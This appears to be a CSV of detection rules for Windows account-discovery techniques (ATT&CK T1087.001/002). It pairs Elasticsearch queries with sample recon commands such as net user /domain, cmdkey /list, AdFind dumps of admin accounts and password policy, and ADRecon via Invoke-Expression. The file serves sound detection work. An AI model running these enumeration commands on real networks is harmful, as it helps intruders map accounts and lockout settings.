T1087.001,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match_phrase"":{""CommandLine"": ""net user""}},
                {""match_phrase"": {""CommandLine"": ""dir c:\\Users""}},
                {""match_phrase"": {""CommandLine"": ""ls C:/Users""}},
                {""match_phrase"": {""CommandLine"": ""ls C:\\Users""}},
                {""match_phrase"": {""CommandLine"": ""get-childitem C:\\Users""}},
                {""match_phrase"": {""CommandLine"": ""cmdkey* /list""}},
                {""match_phrase"": {""CommandLine"": ""net localgroup *Users""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","net user 
&& dir c:\Users\ 
&& cmdkey.exe /list 
&& net localgroup ""Users"" 
&& net localgroup users

get-localuser;
ls C:/Users; 
get-childitem C:\Users\;",2,
T1087.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""query user""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",query user /SERVER:$env:COMPUTERNAME,2,
T1087.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""Get-WmiObject""}},
                {""match_phrase"": {""CommandLine"": ""Win32_UserAccount""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Get-WmiObject -Class Win32_UserAccount,2,
T1087.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""net user""}},
                {""match"": {""CommandLine"": ""domain""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","net user /domain

net user #{domain.user.name} /domain

net user administrator /domain",2,
T1087.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""get-localgroupmember""}},
                {""match"": {""CommandLine"": ""Users""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",get-localgroupmember -group Users; ,2,
T1087.002,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match_phrase"":{""CommandLine"": ""-sc admincountdmp""}},
                {""match_phrase"":{""CommandLine"": ""-sc exchaddresses""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","12011c_AdFind.exe -sc admincountdmp

12011c_AdFind.exe -sc exchaddresses",2,
T1087.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""objectcategory=person""}},
                {""match"": {""CommandLine"": ""-f""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",12011c_AdFind.exe -f (objectcategory=person),2,
T1087.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""adsisearcher""}},
                {""match_phrase"":{""CommandLine"": ""objectcategory=user""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","([adsisearcher]""objectcategory=user"").FindAll(); 
([adsisearcher]""objectcategory=user"").FindOne()",2,
T1087.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""*AdFind*""}},
                        {""match"": {""CommandLine"": ""-s""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match"": {""CommandLine"": ""base""}},
                        {""match"": {""CommandLine"": ""lockoutduration""}},
                        {""match"": {""CommandLine"": ""lockoutthreshold""}},
                        {""match"": {""CommandLine"": ""lockoutobservationwindow""}},
                        {""match"": {""CommandLine"": ""maxpwdage""}},
                        {""match"": {""CommandLine"": ""minpwdage""}},
                        {""match"": {""CommandLine"": ""minpwdlength""}},
                        {""match"": {""CommandLine"": ""pwdhistorylength""}},
                        {""match"": {""CommandLine"": ""pwdproperties""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",12011c_AdFind.exe -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties,2,
T1087.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""Invoke-Expression""}},
                {""match_phrase"": {""CommandLine"": ""ADRecon.ps1""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Invoke-Expression $env:TEMP\ADRecon.ps1,2,
